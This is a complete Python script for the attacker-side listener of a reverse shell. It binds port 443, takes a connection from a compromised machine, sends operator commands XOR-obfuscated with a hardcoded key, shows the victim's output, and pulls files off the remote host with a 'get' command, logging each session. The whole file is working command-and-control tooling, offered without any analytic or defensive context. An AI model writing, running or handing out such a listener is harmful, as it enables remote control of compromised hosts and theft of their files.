# listener_xor.py
import socket
import os
from datetime import datetime

KEY = b'secretkey'
BUFFER_SIZE = 4096

def xor_encrypt(data):
    return bytes([b ^ KEY[i % len(KEY)] for i, b in enumerate(data)])

def ensure_logs():
    os.makedirs("logs", exist_ok=True)

def get_timestamp():
    return datetime.now().strftime("%Y%m%d_%H%M%S")

def log_session(filename, text):
    with open(os.path.join("logs", filename), "a") as f:
        timestamp = datetime.now().strftime("[%Y-%m-%d %H:%M:%S]")
        f.write(f"{timestamp} {text}\n")

def main():
    ensure_logs()
    log_file = f"session_{get_timestamp()}.log"
    server = socket.socket()
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(("0.0.0.0", 443))
    server.listen(1)
    print("[+] Listening on port 443...")

    client_socket, addr = server.accept()
    print(f"[+] Connection from {addr[0]}")
    log_session(log_file, f"Connection from {addr[0]}")

    while True:
        try:
            command = input("Shell> ").strip()
            if not command:
                continue

            client_socket.send(xor_encrypt(command.encode()))
            log_session(log_file, f">>>> {command}")

            if command.lower() == "exit":
                break

            if command.startswith("get "):
                buffer = b""
                while True:
                    chunk = xor_encrypt(client_socket.recv(BUFFER_SIZE))
                    if b"<<END_OF_FILE>>" in chunk:
                        buffer += chunk.replace(b"<<END_OF_FILE>>", b"")
                        break
                    buffer += chunk
                filename = os.path.basename(command.split(" ")[1])
                path = os.path.join("logs", filename)
                with open(path, "wb") as f:
                    f.write(buffer)
                print(f"[+] File saved to {path}")
                log_session(log_file, f"[+] File saved: {path}")
            else:
                response = xor_encrypt(client_socket.recv(BUFFER_SIZE))
                decoded = response.decode(errors="ignore")
                print(decoded)
                log_session(log_file, decoded)
        except Exception as e:
            print(f"[!] Error: {e}")
            break

    client_socket.close()
    print("[!] Session ended.")

if __name__ == "__main__":
    main()
